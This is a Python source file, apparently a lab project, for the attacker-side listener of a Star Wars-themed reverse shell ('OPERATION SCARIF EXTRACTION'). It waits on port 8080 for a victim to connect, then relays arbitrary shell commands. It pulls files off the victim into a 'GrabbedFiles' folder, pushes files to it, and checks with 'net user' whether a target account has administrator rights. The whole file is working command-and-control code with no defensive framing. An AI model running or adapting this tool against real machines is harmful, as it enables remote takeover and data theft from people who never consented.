import os
import socket

def doGrab(conn, command, operation):
    conn.send(command.encode())

    if (operation == "grab"):
        grab, sourcePathAsFileName = command.split("*")
        path = "/home/kali/Desktop/GrabbedFiles"
        fileName = "grabbed_" + sourcePathAsFileName

        f = open(path + fileName, "wb")
        while True:
            bits = conn.recv(5000)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4])
                f.close()
                print('Transfer complete.')
                break
            if 'File not found'.encode() in bits:
                print('Unable to find out the file. Bummer :(')
                break
            f.write(bits)
        print("File name: " + fileName)
        print("Written to: " + path)

def doSend(conn, sourcePath, destinationPath, fileName):
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, "rb")
        packet = sourceFile.read(5000)
        while len(packet) > 0:
            conn.send(packet)
            packet = sourceFile.read(5000)
        conn.send('DONE'.encode())
        print('File transfer complete.')
    else:
        conn.send("File not found".encode())
        print("Where's the file SAUCE??")
        return

def connect():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.153.128", 8080))
    s.listen(1)
    print('-'*60)
    print(" OPERATION SCARIF EXTRACTION")
    print('-'*60)
    print('Listening for incoming fighters on port 8080...')
    conn, addr = s.accept()
    print(f'We got TIE fighters inbound from {addr}!')

    while True:
        print('-'*60)
        command = input('Shell> :')
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif "checkUserAdmin" in command:
            userName = input("Who's the target?: ")
            conn.send(f'net user {userName}'.encode())
            if "Administrators" in conn.recv(1024).decode():
                print("Admin privileges acquired. Let's make some noise ;)")
            else:
                print("No admin privileges on this user.")
                print('"No comprendo? I\'ll show you no comprendo!!"')

        elif 'grab' in command:
            doGrab(conn, command, "grab")
        elif 'send' in command:
            sendCmd, destination, fileName = command.split(" ")
            source = input('Fighter location (source path): ')
            conn.send(command.encode())
            doSend(conn, source, destination, fileName)
        elif 'cd' in command:
            conn.send(command.encode())
            print(conn.recv(5000).decode())

        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())

def main():
    connect()

main()
